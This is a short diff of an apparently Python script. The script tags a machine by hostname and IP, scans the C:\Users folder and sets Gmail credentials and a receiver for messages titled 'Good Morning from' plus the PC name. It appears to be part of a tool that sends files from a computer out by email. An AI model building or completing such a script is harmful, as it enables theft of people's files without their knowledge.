@@ -22,13 +22,16 @@ def getPcName():
     userid = hostname +' @ '+ IP
     return userid
 
-
 folder = "C:\\Users"
+# you can change to specific folder to optimize search time and delay the code scans everything.
+# example C:\\Users\user\Documents
 
 email_username = 'youremail@here.com'
 email_password = 'your_password'
+# your gmail login
 
-email_receiver = 'caffeinemeter@gmail.com'
+email_receiver = email_username
+# to yourself or whatever you'd like
 
 subject = 'Good Morning from: ' + getPcName()
 
